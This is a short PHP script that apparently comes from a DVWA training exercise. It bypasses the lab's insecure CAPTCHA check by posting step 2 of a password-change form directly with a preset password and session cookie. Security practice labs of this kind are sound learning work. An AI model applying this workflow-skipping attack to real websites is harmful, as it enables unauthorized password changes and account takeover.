<?php

require "vendor/autoload.php";

$client = new GuzzleHttp\Client();

$newPassword = "admin123456";

$res = $client->request(
    'POST',
    'http://dvwa.localhost/vulnerabilities/captcha/index.php',
    [
        'headers' => [
            'Cookie' => "security=low; PHPSESSID=vqltcda2nsmg3h5tvr3000a8vl",
        ],
        'form_params' => [
            "step" => 2,
            "password_new" => $newPassword,
            "password_conf" => $newPassword,
            "Change" => "Change",
        ]
    ]
);

var_dump($res->getBody()->getContents());